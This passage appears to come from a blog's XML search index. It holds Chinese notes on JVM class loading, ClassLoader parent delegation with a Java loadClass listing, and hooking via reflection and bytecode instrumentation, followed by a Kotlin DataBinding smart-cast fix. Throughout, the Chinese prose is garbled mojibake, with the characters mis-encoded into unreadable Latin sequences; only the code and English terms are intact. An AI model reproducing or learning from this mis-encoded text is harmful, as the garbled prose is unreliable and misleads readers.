è½½ï¼ŒéªŒè¯ï¼Œå‡†å¤‡ï¼Œè‡ªç„¶éœ€è¦åœ¨æ­¤ä¹‹å‰å¼€å§‹ï¼‰ï¼š</p><ul><li><p>ä½¿ç”¨newå…³é”®å­—å®ä¾‹åŒ–å¯¹è±¡ã€è®¿é—®æˆ–è€…è®¾ç½®ä¸€ä¸ªç±»çš„é™æ€å­—æ®µï¼ˆè¢«finalä¿®é¥°ã€ç¼–è¯‘å™¨ä¼˜åŒ–æ—¶å·²ç»æ”¾å…¥å¸¸é‡æ± çš„ä¾‹å¤–ï¼‰ã€è°ƒç”¨ç±»æ–¹æ³•ï¼Œéƒ½ä¼šåˆå§‹åŒ–è¯¥é™æ€å­—æ®µæˆ–è€…é™æ€æ–¹æ³•æ‰€åœ¨çš„ç±»ã€‚</p></li><li><p>åˆå§‹åŒ–ç±»çš„æ—¶å€™ï¼Œå¦‚æœå…¶çˆ¶ç±»æ²¡æœ‰è¢«åˆå§‹åŒ–è¿‡ï¼Œåˆ™è¦å…ˆè§¦å‘å…¶çˆ¶ç±»åˆå§‹åŒ–ã€‚</p></li><li><p>ä½¿ç”¨java.lang.reflectåŒ…çš„æ–¹æ³•è¿›è¡Œåå°„è°ƒç”¨çš„æ—¶å€™ï¼Œå¦‚æœç±»æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œåˆ™è¦å…ˆåˆå§‹åŒ–ã€‚</p></li><li><p>è™šæ‹Ÿæœºå¯åŠ¨æ—¶ï¼Œç”¨æˆ·ä¼šå…ˆåˆå§‹åŒ–è¦æ‰§è¡Œçš„ä¸»ç±»ï¼ˆå«æœ‰mainï¼‰</p></li><li><p>jdk 1.7åï¼Œå¦‚æœjava.lang.invoke.MethodHandleçš„å®ä¾‹æœ€åå¯¹åº”çš„è§£æç»“æœæ˜¯ REF_getStaticã€REF_putStaticã€REF_invokeStaticæ–¹æ³•å¥æŸ„ï¼Œå¹¶ä¸”è¿™ä¸ªæ–¹æ³•æ‰€åœ¨ç±»æ²¡æœ‰åˆå§‹åŒ–ï¼Œåˆ™å…ˆåˆå§‹åŒ–ã€‚</p></li></ul></blockquote><h4 id="å¸è½½-Unloading"><a href="#å¸è½½-Unloading" class="headerlink" title="å¸è½½ Unloading"></a>å¸è½½ Unloading</h4><blockquote><p>åœ¨æ ˆä¸­ä¸å­˜åœ¨è¯¥ç±»çš„å®ä¾‹ä¸Classå¯¹è±¡ï¼Œä¸”åŠ è½½è¯¥ç±»çš„classLoaderå¤±å»gc rootsæ—¶ï¼Œæ¢è¨€ä¹‹è¯¥ç±»å·²ç»å¤±å»äº†gc rootsï¼Œè¢«gcå›æ”¶ï¼Œæ­¤æ—¶å¯ä»¥ç§°ä½œè¯¥ç±»æˆåŠŸä»jvmä¸­å¸è½½äº†ï¼Œè¿™æ¡æœºåˆ¶ä¹Ÿæ˜¯ä¸€äº›çƒ­ä¿®å¤æ–¹æ¡ˆçš„å®ç°åŸç†(å…¶å®ç°åœ¨å¤§éƒ¨åˆ†çš„çƒ­ä¿®å¤éƒ½æ˜¯ç”¨JavaAgentå®ç°ç±»çš„çƒ­æ›¿æ¢ï¼‰ã€‚</p></blockquote><h3 id="ç±»åŠ è½½å™¨-ClassLoader"><a href="#ç±»åŠ è½½å™¨-ClassLoader" class="headerlink" title="ç±»åŠ è½½å™¨ (ClassLoader)"></a>ç±»åŠ è½½å™¨ (ClassLoader)</h3><h4 id="å„å¸å…¶èŒ"><a href="#å„å¸å…¶èŒ" class="headerlink" title="å„å¸å…¶èŒ"></a>å„å¸å…¶èŒ</h4><p>JVM è¿è¡Œå®ä¾‹ä¸­ä¼šå­˜åœ¨å¤šä¸ª ClassLoaderï¼Œä¸åŒçš„ ClassLoader ä¼šä»ä¸åŒçš„åœ°æ–¹åŠ è½½å­—èŠ‚ç æ–‡ä»¶ã€‚å®ƒå¯ä»¥ä»ä¸åŒçš„æ–‡ä»¶ç›®å½•åŠ è½½ï¼Œä¹Ÿå¯ä»¥ä»ä¸åŒçš„ jar æ–‡ä»¶ä¸­åŠ è½½ï¼Œä¹Ÿå¯ä»¥ä»ç½‘ç»œä¸Šä¸åŒçš„æœåŠ¡åœ°å€æ¥åŠ è½½ã€‚</p><p>JVM ä¸­å†…ç½®äº†ä¸‰ä¸ªé‡è¦çš„ ClassLoaderï¼Œåˆ†åˆ«æ˜¯ BootstrapClassLoaderã€ExtensionClassLoader å’Œ AppClassLoaderã€‚</p><p>BootstrapClassLoader è´Ÿè´£åŠ è½½ JVM è¿è¡Œæ—¶æ ¸å¿ƒç±»ï¼Œè¿™äº›ç±»ä½äº JAVA_HOME/lib/rt.jar æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¸¸ç”¨å†…ç½®åº“ java.xxx.* éƒ½åœ¨é‡Œé¢ï¼Œæ¯”å¦‚ java.util.*ã€java.io.*ã€java.nio.<em>ã€java.lang.</em> ç­‰ç­‰ã€‚è¿™ä¸ª ClassLoader æ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒæ˜¯ç”± C ä»£ç å®ç°çš„ï¼Œæˆ‘ä»¬å°†å®ƒç§°ä¹‹ä¸ºã€Œæ ¹åŠ è½½å™¨ã€ã€‚</p><p>ExtensionClassLoader è´Ÿè´£åŠ è½½ JVM æ‰©å±•ç±»ï¼Œæ¯”å¦‚ swing ç³»åˆ—ã€å†…ç½®çš„ js å¼•æ“ã€xml è§£æå™¨ ç­‰ç­‰ï¼Œè¿™äº›åº“åé€šå¸¸ä»¥ javax å¼€å¤´ï¼Œå®ƒä»¬çš„ jar åŒ…ä½äº JAVA_HOME/lib/ext/*.jar ä¸­ï¼Œæœ‰å¾ˆå¤š jar åŒ…ã€‚</p><p>AppClassLoader æ‰æ˜¯ç›´æ¥é¢å‘æˆ‘ä»¬ç”¨æˆ·çš„åŠ è½½å™¨ï¼Œå®ƒä¼šåŠ è½½ Classpath ç¯å¢ƒå˜é‡é‡Œå®šä¹‰çš„è·¯å¾„ä¸­çš„ jar åŒ…å’Œç›®å½•ã€‚æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ä»£ç ä»¥åŠä½¿ç”¨çš„ç¬¬ä¸‰æ–¹ jar åŒ…é€šå¸¸éƒ½æ˜¯ç”±å®ƒæ¥åŠ è½½çš„ã€‚</p><p>é‚£äº›ä½äºç½‘ç»œä¸Šé™æ€æ–‡ä»¶æœåŠ¡å™¨æä¾›çš„ jar åŒ…å’Œ classæ–‡ä»¶ï¼Œjdk å†…ç½®äº†ä¸€ä¸ª URLClassLoaderï¼Œç”¨æˆ·åªéœ€è¦ä¼ é€’è§„èŒƒçš„ç½‘ç»œè·¯å¾„ç»™æ„é€ å™¨ï¼Œå°±å¯ä»¥ä½¿ç”¨ URLClassLoader æ¥åŠ è½½è¿œç¨‹ç±»åº“äº†ã€‚URLClassLoader ä¸ä½†å¯ä»¥åŠ è½½è¿œç¨‹ç±»åº“ï¼Œè¿˜å¯ä»¥åŠ è½½æœ¬åœ°è·¯å¾„çš„ç±»åº“ï¼Œå–å†³äºæ„é€ å™¨ä¸­ä¸åŒçš„åœ°å€å½¢å¼ã€‚ExtensionClassLoader å’Œ AppClassLoader éƒ½æ˜¯ URLClassLoader çš„å­ç±»ï¼Œå®ƒä»¬éƒ½æ˜¯ä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿé‡ŒåŠ è½½ç±»åº“ã€‚</p><p>AppClassLoader å¯ä»¥ç”± ClassLoader ç±»æä¾›çš„é™æ€æ–¹æ³• getSystemClassLoader() å¾—åˆ°ï¼Œå®ƒå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„ã€Œç³»ç»Ÿç±»åŠ è½½å™¨ã€ï¼Œæˆ‘ä»¬ç”¨æˆ·å¹³æ—¶ç¼–å†™çš„ç±»ä»£ç é€šå¸¸éƒ½æ˜¯ç”±å®ƒåŠ è½½çš„ã€‚å½“æˆ‘ä»¬çš„ main æ–¹æ³•æ‰§è¡Œçš„æ—¶å€™ï¼Œè¿™ç¬¬ä¸€ä¸ªç”¨æˆ·ç±»çš„åŠ è½½å™¨å°±æ˜¯ AppClassLoaderã€‚</p><h4 id="ClassLoader-ä¼ é€’æ€§"><a href="#ClassLoader-ä¼ é€’æ€§" class="headerlink" title="ClassLoader ä¼ é€’æ€§"></a>ClassLoader ä¼ é€’æ€§</h4><p>ç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†ä¸€ä¸ªæœªçŸ¥çš„ç±»ï¼Œå®ƒä¼šé€‰æ‹©å“ªä¸ª ClassLoader æ¥åŠ è½½å®ƒå‘¢ï¼Ÿè™šæ‹Ÿæœºçš„ç­–ç•¥æ˜¯ä½¿ç”¨è°ƒç”¨è€… Class å¯¹è±¡çš„ ClassLoader æ¥åŠ è½½å½“å‰æœªçŸ¥çš„ç±»ã€‚ä½•ä¸ºè°ƒç”¨è€… Class å¯¹è±¡ï¼Ÿå°±æ˜¯åœ¨é‡åˆ°è¿™ä¸ªæœªçŸ¥çš„ç±»æ—¶ï¼Œè™šæ‹Ÿæœºè‚¯å®šæ­£åœ¨è¿è¡Œä¸€ä¸ªæ–¹æ³•è°ƒç”¨ï¼ˆé™æ€æ–¹æ³•æˆ–è€…å®ä¾‹æ–¹æ³•ï¼‰ï¼Œè¿™ä¸ªæ–¹æ³•æŒ‚åœ¨å“ªä¸ªç±»ä¸Šé¢ï¼Œé‚£è¿™ä¸ªç±»å°±æ˜¯è°ƒç”¨è€… Class å¯¹è±¡ã€‚å‰é¢æˆ‘ä»¬æåˆ°æ¯ä¸ª Class å¯¹è±¡é‡Œé¢éƒ½æœ‰ä¸€ä¸ª classLoader å±æ€§è®°å½•äº†å½“å‰çš„ç±»æ˜¯ç”±è°æ¥åŠ è½½çš„ã€‚</p><p>å› ä¸º ClassLoader çš„ä¼ é€’æ€§ï¼Œæ‰€æœ‰å»¶è¿ŸåŠ è½½çš„ç±»éƒ½ä¼šç”±åˆå§‹è°ƒç”¨ main æ–¹æ³•çš„è¿™ä¸ª ClassLoader å…¨å…¨è´Ÿè´£ï¼Œå®ƒå°±æ˜¯ AppClassLoaderã€‚</p><h4 id="åŒäº²å§”æ´¾"><a href="#åŒäº²å§”æ´¾" class="headerlink" title="åŒäº²å§”æ´¾"></a>åŒäº²å§”æ´¾</h4><p>åŒäº²å§”æ´¾æ¨¡å‹çš„å·¥ä½œè¿‡ç¨‹ä¸ºï¼šå¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œæ¯ä¸€ä¸ªå±‚æ¬¡çš„åŠ è½½å™¨éƒ½æ˜¯å¦‚æ­¤ï¼Œå› æ­¤æ‰€æœ‰çš„ç±»åŠ è½½è¯·æ±‚éƒ½ä¼šä¼ ç»™é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œåªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¯¥åŠ è½½è¯·æ±‚ï¼ˆè¯¥åŠ è½½å™¨çš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„ç±»ï¼‰æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ã€‚</p><p>ä½¿ç”¨åŒäº²å§”æ´¾æ¨¡å‹çš„å¥½å¤„åœ¨äº<strong>Javaç±»éšç€å®ƒçš„ç±»åŠ è½½å™¨ä¸€èµ·å…·å¤‡äº†ä¸€ç§å¸¦æœ‰ä¼˜å…ˆçº§çš„å±‚æ¬¡å…³ç³»</strong>ã€‚ä¾‹å¦‚ç±»java.lang.Objectï¼Œå®ƒå­˜åœ¨åœ¨rt.jarä¸­ï¼Œæ— è®ºå“ªä¸€ä¸ªç±»åŠ è½½å™¨è¦åŠ è½½è¿™ä¸ªç±»ï¼Œæœ€ç»ˆéƒ½æ˜¯å§”æ´¾ç»™å¤„äºæ¨¡å‹æœ€é¡¶ç«¯çš„Bootstrap ClassLoaderè¿›è¡ŒåŠ è½½ï¼Œå› æ­¤Objectç±»åœ¨ç¨‹åºçš„å„ç§ç±»åŠ è½½å™¨ç¯å¢ƒä¸­éƒ½æ˜¯åŒä¸€ä¸ªç±»ã€‚ç›¸åï¼Œå¦‚æœæ²¡æœ‰åŒäº²å§”æ´¾æ¨¡å‹è€Œæ˜¯ç”±å„ä¸ªç±»åŠ è½½å™¨è‡ªè¡ŒåŠ è½½çš„è¯ï¼Œå¦‚æœç”¨æˆ·ç¼–å†™äº†ä¸€ä¸ªjava.lang.Objectçš„åŒåç±»å¹¶æ”¾åœ¨ClassPathä¸­ï¼Œé‚£ç³»ç»Ÿä¸­å°†ä¼šå‡ºç°å¤šä¸ªä¸åŒçš„Objectç±»ï¼Œç¨‹åºå°†æ··ä¹±ã€‚å› æ­¤ï¼Œå¦‚æœå¼€å‘è€…å°è¯•ç¼–å†™ä¸€ä¸ªä¸rt.jarç±»åº“ä¸­é‡åçš„Javaç±»ï¼Œå¯ä»¥æ­£å¸¸ç¼–è¯‘ï¼Œä½†æ˜¯æ°¸è¿œæ— æ³•è¢«åŠ è½½è¿è¡Œã€‚</p><p><img src="https://img-blog.csdn.net/20160506184936657" alt="ç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æ¨¡å‹"></p><p><strong>åŒäº²å§”æ´¾æ¨¡å‹çš„ç³»ç»Ÿå®ç°</strong></p><p>åœ¨java.lang.ClassLoaderçš„loadClass()æ–¹æ³•ä¸­ï¼Œå…ˆæ£€æŸ¥æ˜¯å¦å·²ç»è¢«åŠ è½½è¿‡ï¼Œè‹¥æ²¡æœ‰åŠ è½½åˆ™è°ƒç”¨çˆ¶ç±»åŠ è½½å™¨çš„loadClass()æ–¹æ³•ï¼Œè‹¥çˆ¶åŠ è½½å™¨ä¸ºç©ºåˆ™é»˜è®¤ä½¿ç”¨å¯åŠ¨ç±»åŠ è½½å™¨ä½œä¸ºçˆ¶åŠ è½½å™¨ã€‚å¦‚æœçˆ¶åŠ è½½å¤±è´¥ï¼Œåˆ™æŠ›å‡ºClassNotFoundExceptionå¼‚å¸¸åï¼Œå†è°ƒç”¨è‡ªå·±çš„findClass()æ–¹æ³•è¿›è¡ŒåŠ è½½ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">synchronized</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">{</span>    <span class="token comment">//check the class has been loaded or not</span>    <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>parent <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                c <span class="token operator">=</span> <span class="token function">findBootstrapClassOrNull</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//if throws the exception ,the father can not complete the load</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            c <span class="token operator">=</span> <span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">resolveClass</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ï¼ŒåŒäº²å§”æ´¾æ¨¡å‹æ˜¯Javaè®¾è®¡è€…æ¨èç»™å¼€å‘è€…çš„ç±»åŠ è½½å™¨çš„å®ç°æ–¹å¼ï¼Œå¹¶ä¸æ˜¯å¼ºåˆ¶è§„å®šçš„ã€‚å¤§å¤šæ•°çš„ç±»åŠ è½½å™¨éƒ½éµå¾ªè¿™ä¸ªæ¨¡å‹ï¼Œä½†æ˜¯JDKä¸­ä¹Ÿæœ‰è¾ƒå¤§è§„æ¨¡ç ´ååŒäº²æ¨¡å‹çš„æƒ…å†µï¼Œä¾‹å¦‚çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ï¼ˆThread Context ClassLoaderï¼‰çš„å‡ºç°ï¼Œå…·ä½“åˆ†æå¯ä»¥å‚è§ã€Šæ·±å…¥ç†è§£Javaè™šæ‹Ÿæœºã€‹ã€‚</p><h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><h3 id="ä»€ä¹ˆæ˜¯Hook"><a href="#ä»€ä¹ˆæ˜¯Hook" class="headerlink" title="ä»€ä¹ˆæ˜¯Hook"></a>ä»€ä¹ˆæ˜¯Hook</h3><p>hookæˆ‘è®¤ä¸ºæ›´åƒæ˜¯ä¸€ç§æ€æƒ³ï¼Œè€Œéä¸€é—¨å•ç‹¬çš„æŠ€æœ¯ï¼Œå…¶å®å°±æ˜¯é€šè¿‡ä¸€äº›æ—é—¨å·¦é“å»é€šè¿‡ä»£ç†ä¿®æ”¹åˆ«äººçš„ä»£ç æ¥è¾¾æˆä¸€äº›æ„æƒ³ä¸åˆ°çš„åŠŸèƒ½ã€‚è€Œé€šè¿‡è¿™äº›æ—é—¨å·¦é“å…¶å®æ˜¯æ²¡åŠæ³•éšå¿ƒæ‰€æ¬²çš„ä¿®æ”¹ä»£ç çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä»æŸäº›åœ°æ–¹å…¥æ‰‹ï¼Œè¿™äº›åœ°æ–¹è¢«ç§°ä½œ<strong>hookç‚¹</strong>ã€‚</p><h3 id="æ€ä¹ˆå®ç°Hook"><a href="#æ€ä¹ˆå®ç°Hook" class="headerlink" title="æ€ä¹ˆå®ç°Hook"></a>æ€ä¹ˆå®ç°Hook</h3><p><img src="https://pic2.zhimg.com/80/v2-58f3800446ebb35fa8f38de1449a6af5_1440w.jpg" alt="img"></p><p>é‚£æˆ‘å°±è®²è®²æœ€åŸºç¡€çš„åå°„/åŠ¨æ€ä»£ç†Hookå§ã€‚</p><p>å‡å¦‚æˆ‘ä»¬å¯¼å…¥çš„å¤–éƒ¨åº“çš„ç½‘ç»œè¯·æ±‚éƒ¨åˆ†æœ‰è¿™ä¹ˆä¸€æ®µä»£ç :</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">object</span> ServiceHolder <span class="token punctuation">{</span>    <span class="token keyword">val</span> apiService<span class="token operator">:</span> IWebServiceRepository <span class="token operator">=</span> <span class="token function">WebServiceRepository</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// ...</span><span class="token punctuation">}</span><span class="token comment">// WebServiceRepository</span><span class="token keyword">class</span> WebServiceRepository <span class="token operator">:</span> IWebServiceRepository <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">val</span> BASE_URL <span class="token operator">=</span> <span class="token string">"https://api.bifrost.kim"</span>        <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">getJsonData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Data <span class="token punctuation">{</span>        <span class="token comment">// ...</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶è€Œå®ƒçš„æ¥å£æ”¹äº†ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸€ä¸‹è¯·æ±‚çš„æ–¹å¼</p><p>æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æˆ‘ä»¬ç›´æ¥åŠ¨æ€ä»£ç†apiServiceï¼Œç„¶ååå°„æ”¾è¿›å»ã€‚</p><p>ä½†InvocationHandleræä¾›çš„åŠ¨æ€ä»£ç†ä¹Ÿè®¸ä¸æ˜¯å¾ˆæ–¹ä¾¿ï¼Œåªèƒ½åœ¨å¤´éƒ¨æˆ–è€…å°¾éƒ¨æ’å…¥é€»è¾‘ã€‚å³ä¾¿æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹éƒ¨åˆ†å­—ç¬¦ä¸²ï¼Œå°±å¾—é‡å†™æ•´ä¸ªç½‘ç»œè¯·æ±‚æ–¹æ³•çš„é€»è¾‘ã€‚</p><p>é‚£ä¹ˆæ›´å¥½çš„æ–¹æ³•æ˜¯ä»€ä¹ˆå‘¢ï¼Œæ­£æ˜¯å­—èŠ‚ç æ’æ¡©ï¼Œæˆ‘ä»¬ä½¿ç”¨å­—èŠ‚ç ç”Ÿæˆä¸€ä¸ªä¸€æ ·çš„ç±»ï¼Œå†ç”¨asmç¨å¾®çš„ä¿®æ”¹è¿™å…¶ä¸­çš„éƒ¨åˆ†é€»è¾‘å³å¯ã€‚</p><h3 id="åˆ©ç”¨LSposedå®ç°å…¨å±€Hook-æœ‰æ—¶é—´å†ç ”ç©¶"><a href="#åˆ©ç”¨LSposedå®ç°å…¨å±€Hook-æœ‰æ—¶é—´å†ç ”ç©¶" class="headerlink" title="åˆ©ç”¨LSposedå®ç°å…¨å±€Hook (æœ‰æ—¶é—´å†ç ”ç©¶)"></a>åˆ©ç”¨LSposedå®ç°å…¨å±€Hook (æœ‰æ—¶é—´å†ç ”ç©¶)</h3><blockquote><p>æœ‰æ—¶é—´å†è¯´å§ æˆ‘æ²¡ç ”ç©¶ï¼ˆ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASM </tag>
            
            <tag> JVM </tag>
            
            <tag> å­—èŠ‚ç  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åœ¨DataBindingçš„ä½¿ç”¨è¿‡ç¨‹ä¸­è¸©çš„å‘</title>
      <link href="/2022/09/03/problem-databinding/"/>
      <url>/2022/09/03/problem-databinding/</url>
      
        <content type="html"><![CDATA[<h1 id="åœ¨DataBindingçš„ä½¿ç”¨è¿‡ç¨‹ä¸­è¸©çš„å‘"><a href="#åœ¨DataBindingçš„ä½¿ç”¨è¿‡ç¨‹ä¸­è¸©çš„å‘" class="headerlink" title="åœ¨DataBindingçš„ä½¿ç”¨è¿‡ç¨‹ä¸­è¸©çš„å‘"></a>åœ¨DataBindingçš„ä½¿ç”¨è¿‡ç¨‹ä¸­è¸©çš„å‘</h1><p>ä»Šå¤©åˆæ¬¡å°è¯•äº†DataBindingï¼Œä¹‹å‰ä¸€ç›´åœ¨ç”¨ViewBindingã€‚ä»Šå¤©æ¬£å–œçš„å‘ç°DataBindingåŒ…å«äº†ViewBindingçš„å…¨éƒ¨åŠŸèƒ½ï¼Œç»ç»å­ã€‚</p><p>DataBindingå¯¹äºåŸºäºMVVMæ¶æ„ç†å¿µè®¾è®¡çš„Androidç¨‹åºæ¥è¯´éå¸¸æœ‰æ„ä¹‰ï¼Œå®ƒå¯ä»¥è¿›ä¸€æ­¥è§£è€¦ã€‚</p><p>ä¸è¯´äº†ï¼Œæ¥çœ‹çœ‹æˆ‘ä»Šå¤©é‡åˆ°çš„å…·ä½“é—®é¢˜</p><blockquote><p>DataBindingå¯èƒ½ä¼šå¯¼è‡´Kotlinç¼–è¯‘å™¨æ— æ³•smart cast, è€ŒIDEä¸ä¼šæ ‡çº¢</p></blockquote><p>æˆ‘åœ¨å¸ƒå±€æ–‡ä»¶activity_login.xmlä¸­ç»™å¸ƒå±€ç»‘å®šäº†è¿™æ ·ä¸€ä¸ªå˜é‡</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>variable</span>        <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewModel<span class="token punctuation">"</span></span>        <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>kim.bifrost.coldrain.wanandroid.viewmodel.LoginViewModel<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>data</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚ä½ æ‰€è§ï¼Œæˆ‘åœ¨ä»£ç ä¸­å‡†å¤‡ä½¿ç”¨å®ƒ</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">binding<span class="token punctuation">.</span>viewModel<span class="token punctuation">.</span><span class="token function">postLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™è¡Œä»£ç åœ¨IDEä¸­å¹¶æ²¡æœ‰æ ‡çº¢ï¼Œä½†æ— æ³•é€šè¿‡ç¼–è¯‘</p><pre class="line-numbers language-none"><code class="language-none">e: E:\ColdRain_Moro\AndroidProject\WanAndroid\app\src\main\java\kim\bifrost\coldrain\wanandroid\view\activity\LoginActivity.kt: (31, 13): Smart cast to 'LoginViewModel' is impossible, because 'binding.viewModel' is a complex expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é‡äº‹ä¸å†³é—®åº¦å¨˜ï¼Œäºæ˜¯åœ¨ç™¾åº¦ä¸Šæ‰¾åˆ°äº†ç­”æ¡ˆ (<a href="https://www.javaer101.com/article/52202734.html">åœ¨Kotlinä¸­æ— æ³•è¿›è¡ŒSmart Cast - Javaer101</a>)</p><p>åŸæ¥è¿™ä¸ªviewModelå˜é‡çš„ç±»å‹å®é™…ä¸Šæ˜¯LoginViewModel?ï¼Œä¹Ÿå°±æ˜¯å®ƒæ˜¯å…è®¸ä¸ºç©ºçš„ã€‚è€Œæˆ‘è·å–çš„æ—¶å€™æ˜¯ç›´æ¥ä»¥LoginViewModelçš„å½¢å¼è·å–ï¼Œå®ƒæ²¡æœ‰åŠæ³•ä»LoginViewModel?ç±»å‹smart castä¸ºLoginViewModelã€‚</p><p>é‚£ä¹ˆåœ¨è°ƒç”¨çš„æ—¶å€™åé¢åŠ ä¸ª?å°±è§£å†³äº†ã€‚</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">binding<span class="token punctuation">.</span>viewModel<span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">postLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹‹æ‰€ä»¥è®°å½•ä¸‹æ¥ï¼Œæ˜¯å› ä¸ºAndroid Studioæ²¡æœ‰ç»™ä¹‹å‰é”™è¯¯çš„ç”¨æ³•æ ‡çº¢ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªè¿˜æ˜¯åº”è¯¥æ ‡ä¸ªçº¢çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rustç¬”è®°å…¶ä¸€</title>
      <link href="/2022/09/03/rust-note-1/"/>
      <url>/2022/09/03/rust-note-1/</url>
      
